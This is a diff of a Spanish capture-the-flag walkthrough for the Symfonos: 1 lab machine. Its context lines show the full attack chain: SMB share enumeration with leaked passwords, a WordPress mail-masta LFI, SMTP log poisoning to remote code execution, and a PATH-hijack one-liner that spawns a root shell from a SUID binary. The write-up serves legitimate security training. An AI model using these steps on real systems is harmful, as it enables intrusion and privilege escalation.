@@ -1,8 +1,8 @@
 # SYMFONOS: 1
 
-<img width="200" height="149" alt="s1" src="https://github.com/user-attachments/assets/4e6841e6-9460-4768-8fae-3b1a2decac3c" />
+![Sir_Peter_Paul_Rubens,_The_Fall_of_Phaeton,_c _1604-1605,_probably_reworked_c _1606-1608,_NGA_71349](https://github.com/user-attachments/assets/50122476-47eb-40f7-82b5-b629703eb524)
 
-1- Enumeración de hosts con `arp-scan`
+## 1. Enumeración de hosts
 ```console
 sudo arp-scan --interface vboxnet0 192.168.56.0/24
 ```
@@ -17,7 +17,7 @@ Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
 Ending arp-scan 1.10.0: 256 hosts scanned in 2.176 seconds (117.65 hosts/sec). 2 responded
 ```
 
-2- Enumeración de puertos con `nmap`
+## 2. Enumeración de puertos
 ```console
   sudo nmap -sT -sV -O 192.168.56.18
 ```
@@ -45,7 +45,7 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 13.16 seconds
 ```
 
-3- Enumeración del protocolo SMB con `smbclient`
+## 3. Enumeración del protocolo SMB
 ```console
 smbclient -L //192.168.56.18 -N
 ```
@@ -67,7 +67,7 @@ Reconnecting with SMB1 for workgroup listing.
         WORKGROUP            SYMFONOS
 ```
 
-3.1- Enumeración de archivos en el directorio compartido con login anónimo "anonymous"
+## 3.1. Enumeración de archivos con login anónimo
 ```console
 smbclient //192.168.56.18/anonymous -N
 ```
@@ -92,7 +92,7 @@ Can users please stop using passwords like 'epidioko', 'qwerty' and 'baseball'!
 Next person I find using one of these passwords will be fired
 ```
 
-3.2- Enumeración de archivos en el directorio compartido "helios"
+## 3.2. Enumeración de archivos en el directorio compartido "helios"
 ```console
 smbclient //192.168.56.18/helios -U helios%qwerty
 ```
@@ -122,7 +122,7 @@ Helios (also Helius) was the god of the Sun in Greek mythology. He was thought t
 3. Work on /h3l105
 ```
 
-4- Enumeracion del gestor de contenido `wordpress` en el blog http://192.168.56.18/h3l105
+## 4. Enumeracion del gestor de contenido `wordpress` en el blog http://192.168.56.18/h3l105
 ```console
  echo "192.168.56.18 symfonos.local" | sudo tee -a /etc/hosts 
  # Nota: Usar http://192.168.56.18/h3l105 al especificar la url hace que no se detecten los plugins y temas de Wordpress, por eso usamos el nombre del dominio.
@@ -247,7 +247,7 @@ Interesting Finding(s):
 [+] Elapsed time: 00:00:09
 ```
 
-4.1- Explotación de una vulnerabilidad en el plugin "mail-masta", versión 1.0 (LFI)
+## 4.1. Explotación de una vulnerabilidad en el plugin "mail-masta", versión 1.0 (LFI)
 ```
  # Tomado de https://www.exploit-db.com/exploits/40290 
  [+] Date: [23-8-2016]
@@ -319,7 +319,7 @@ mysql:x:108:114:MySQL Server,,,:/nonexistent:/bin/false
 postfix:x:109:115::/var/spool/postfix:/bin/false
 ```
 
-5- Envenenamiento de logs via SMTP (RCE)
+## 5. Envenenamiento de logs via SMTP (RCE)
 ```
  nc 192.168.56.18 25
 220 symfonos.localdomain ESMTP Postfix (Debian/GNU)
@@ -472,7 +472,7 @@ bash: cannot set terminal process group (563): Inappropriate ioctl for device
 bash: no job control in this shell
 ```
 
-6- Enumeración de programas con permisos SUID
+## 6. Enumeración de programas con permisos SUID
 ```console
 find / -perm -4000 -user root -type f -ls 2>/dev/null
 ```
@@ -494,7 +494,7 @@ find / -perm -4000 -user root -type f -ls 2>/dev/null
    655427     60 -rwsr-xr-x   1 root     root          61240 Nov 10  2016 /bin/ping
 ```
 
-6.1- Copia y análisis del binario sospechoso "/opt/statuscheck":
+## 6.1 Copia y análisis del binario sospechoso
 ```console
 # shell remota
 cat /opt/statuscheck | nc -lnvp 5555 -q 1
@@ -533,7 +533,7 @@ r2 -A -c "s main;pdf" statuscheck 2>/dev/null
 [0x000006b0]>
 ```
 
-6.2- Modificación de la variable de entorno PATH para forzar la ejecucion de un script llamado `curl` malicioso.
+## 6.2 PATH Hijacking
 ```bash
 cd /tmp; export PATH=/tmp:$PATH; printf "#\!/bin/sh\n/bin/bash -p" > curl; chmod u+x curl; /opt/statuscheck
 ```
